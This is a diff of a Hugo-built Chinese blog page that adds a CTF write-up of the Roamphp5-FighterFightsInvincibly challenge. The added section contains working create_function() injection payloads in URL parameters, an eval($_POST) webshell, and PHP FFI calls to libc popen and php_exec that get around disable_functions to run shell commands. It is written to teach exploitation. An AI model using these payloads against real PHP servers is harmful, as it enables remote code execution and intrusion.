@@ -50,7 +50,11 @@
 </ul>
 </li>
 <li><a href=#serializable>Serializable</a></li>
-<li><a href=#rctf-2019nextphp>[RCTF 2019]Nextphp</a></li>
+<li><a href=#rctf-2019nextphp>[RCTF 2019]Nextphp</a>
+<ul>
+<li><a href=#极客大挑战-2020roamphp5-fighterfightsinvincibly>[极客大挑战 2020]Roamphp5-FighterFightsInvincibly</a></li>
+</ul>
+</li>
 </ul>
 </nav>
 </div>
@@ -379,6 +383,29 @@ In python: int: <span style=color:#ae81ff>6</span> float 2.3 <span style=color:#
 <p>但是多次尝试失败，之后看到了这个<a href=https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp>wp</a>之后再看<a href=https://wiki.php.net/rfc/ffi>官方文档</a>还有<a href=https://www.laruence.com/2020/03/11/5475.html>这一篇</a>就明白了</p>
 <p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223422195.png alt=image-20211202223422195></p>
 <p>默认情况下FFI只会被用于CLI模式下&预加载php脚本，除非设置<code>ffi.enable=true</code>，设置之后在webshell就可以直接用蚁剑插件了</p>
+<h3 id=极客大挑战-2020roamphp5-fighterfightsinvincibly>[极客大挑战 2020]Roamphp5-FighterFightsInvincibly</h3>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173057497.png alt=image-20211204173057497></p>
+<p>很漂亮的前端，看页面源码有注释的提示</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173130852.png alt=image-20211204173130852></p>
+<p>这个形式，真的是一眼<code>create_function()</code>了，看一下phpinfo()，用的还是<code>create_function()</code>的注入</p>
+<pre tabindex=0><code>?fighter=create_function&amp;fights=&amp;invincibly=;}phpinfo();/*
+</code></pre><p>看下disable_function</p>
+<pre tabindex=0><code>system,exec,shell_exec,passthru,proc_open,proc_close,&amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&amp;nbsp;socket_connect,&amp;nbsp;stream_socket_server,&amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,&amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&amp;nbsp;posix_getrlimit,&amp;nbsp;posix_getsid,posix_getuid,posix_isatty,&amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname&lt;/td&gt;&lt;td class=&quot;v&quot;&gt;system,exec,shell_exec,passthru,proc_open,proc_close,&amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&amp;nbsp;socket_connect,&amp;nbsp;stream_socket_server,&amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,&amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&amp;nbsp;posix_getrlimit,&amp;nbsp;posix_getsid,posix_getuid,posix_isatty,&amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname
+</code></pre><p>直接不用看了，有一吨，肯定得绕过；蚁剑的各种插件都失败，得手动绕，ffi扩展开着</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204174245283.png alt=image-20211204174245283></p>
+<p>看到这里<code>ffi.enable=On</code>，符合蚁剑插件的应用条件，写个webshell试试</p>
+<pre tabindex=0><code>?fighter=create_function&amp;fights=&amp;invincibly=;}eval($_POST[wuhu]);/*
+</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204175626714.png alt=image-20211204175626714></p>
+<p>what&rsquo;s up，竟然没有回显</p>
+<p>尝试ping，发现还不出网，不能用curl外带flag</p>
+<p>那只能从FFI本身下手了，调用c的popen 用管道读命令执行的结果</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#111>FILE</span> <span style=color:#f92672>*</span><span style=color:#75af00>popen</span><span style=color:#111>(</span><span style=color:#00a8c8>const</span> <span style=color:#00a8c8>char</span><span style=color:#f92672>*</span> <span style=color:#111>command</span><span style=color:#111>,</span><span style=color:#00a8c8>const</span> <span style=color:#00a8c8>char</span><span style=color:#f92672>*</span> <span style=color:#111>type</span><span style=color:#111>);</span>
+</code></pre></div><p><code>popen</code>会调用<code>fork()</code>产生子进程，然后从子进程中调用<code>/bin/sh -c</code>来执行参数的命令，type有r(read)和w(write)，依照这个值<code>popen</code>会建立管道连接到子进程的标准输出设备或写入到子进程的标准输入设备中</p>
+<pre tabindex=0><code>?fighter=create_function&amp;fights=&amp;invincibly=;}$ffi = FFI::cdef(&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o = $ffi-&gt;popen(&quot;ls / -lah&quot;,&quot;r&quot;);$d = &quot;&quot;;while(($c = $ffi-&gt;fgetc($o)) != -1){$d .= str_pad(strval(dechex($c)),2,&quot;0&quot;,0);}$ffi-&gt;pclose($o);echo hex2bin($d);/*
+</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204180626497.png alt=image-20211204180626497></p>
+<p>另一种方法是调用php源码中的函数<code>php_exec()</code>，当它的参数type为3时对应调用的是<code>passthru()</code>函数，其执行命令可以将结果原始输出</p>
+<pre tabindex=0><code>?fighter=create_function&amp;fights=&amp;invincibly=;}$ffi = FFI::cdef(&quot;int php_exec(int type, char *cmd);&quot;);$ffi-&gt;php_exec(3,&quot;ls /&quot;);/*
+</code></pre><p>但是，这道题在buu复现不了，原因是uuid有32个字符，加上连字符有36位，再加上flag{}有42位，但是/readflag程序只允许读出37个字符，所以最后的5位是读不出来的（辣个唯一解可能是爆破的 我试着爆了一会 加延时得跑好久好久好久 放弃了</p>
 <hr>
 <p>最近在刷buuoj，有望这个月内把50解以上的题做完捏</p>
 <hr>
@@ -392,7 +419,7 @@ In python: int: <span style=color:#ae81ff>6</span> float 2.3 <span style=color:#
 <p><a href=https://towardsdatascience.com/do-you-hate-how-slow-python-is-this-is-how-you-can-make-it-run-faster-532468fe1583>Do You Hate How Slow Python Is? This Is How You Can Make It Run Faster!</a> | <a href=https://towardsdatascience.com/make-python-faster-with-cffi-python-bindings-eb5402bc35dd>Make Python Faster with CFFI Python Bindings</a></p>
 <p><a href=https://cffi.readthedocs.io/en/latest/>CFFI documentation</a> | <a href=https://docs.python.org/3/library/ctypes.html>ctypes documentation</a></p>
 <p><a href=https://www.cnblogs.com/ccxikka/p/9637545.html>Python cffi学习 </a> | <a href=https://github.com/wolever/python-cffi-example>cffi-example: an example project showing how to use Python&rsquo;s CFFI</a></p>
-<p><a href=https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp>wp</a></p>
+<p><a href=https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp>wp</a> | <a href=http://www.lshhaisheng.com/2021/08/02/%E7%BB%95%E8%BF%87disable_function/>wp2</a></p>
 </details>
 </div>
 </section>
@@ -481,7 +508,7 @@ placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search>
 </div>
 <div class="text-sm text-gray-500 leading-tight a-gray">
 <br>
-Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 3214 words in this page.
+Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 3822 words in this page.
 </div>
 </div>
 </div>
